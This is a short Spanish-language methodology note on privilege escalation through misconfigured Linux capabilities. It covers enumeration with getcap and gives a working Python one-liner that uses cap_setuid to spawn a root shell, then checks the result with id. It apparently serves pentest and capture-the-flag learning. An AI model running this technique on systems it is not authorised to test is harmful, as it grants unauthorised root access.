---
title: Linux Capabilities – Abuse
description: Abuso de Linux capabilities para escalada de privilegios
tags:
  - linux
  - privesc
  - capabilities
  - methodology
---

# Linux Capabilities – Abuse

Linux **capabilities** permiten dividir los privilegios tradicionales de root en permisos más pequeños y asignarlos de forma granular a procesos o binarios.  
Una configuración incorrecta puede permitir **escalada de privilegios sin necesidad de SUID**.

---

## Concepto

En lugar de otorgar privilegios completos mediante el bit SUID, Linux permite asignar capacidades específicas como:

- `cap_setuid`
- `cap_net_bind_service`
- `cap_dac_override`
- `cap_sys_admin`
- etc.

Cuando estas capacidades se asignan a binarios **interpretados** (Python, Perl, Ruby…) o mal controlados, pueden ser abusadas para obtener acceso como **root**.

---

## Enumeración de capabilities

### Listar binarios con capabilities

```bash
getcap -r / 2>/dev/null
```

Ejemplo de salida relevante:

```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Esto indica que el binario puede:
- Cambiar su UID (`cap_setuid`)
- Escuchar en puertos privilegiados (`cap_net_bind_service`)

---

## Capacidad crítica: `cap_setuid`
La capacidad `cap_setuid` permite a un proceso cambiar su UID arbitrariamente, incluyendo UID 0 (root), **sin necesidad del bit SUID**.

Esto rompe el modelo clásico de privilegios y suele considerarse un ***misconfiguration* grave**.

---

## Abuso con binarios interpretados
Cuando un intérprete (por ejemplo, Python) tiene `cap_setuid`, es posible ejecutar código que:
1. Cambie el UID del proceso a 0
2. Ejecute una shell o comando con privilegios de root

## Ejemplo: Python con cap_setuid

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Resultado:
- El proceso cambia su UID a 0
- Se obtiene una shell como root

---

## Validación

```bash
id
```

Salida esperada:
```bash
uid=0(root) gid=0(root) groups=0(root)
```

## Herramientas útiles
- `getcap`
- `setcap`
- `linPEAS` (detección automática)
- `GTFOBins`

Referencias
- https://gtfobins.github.io/
- https://gtfobins.github.io/gtfobins/python/#capabilities
- https://man7.org/linux/man-pages/man7/capabilities.7.html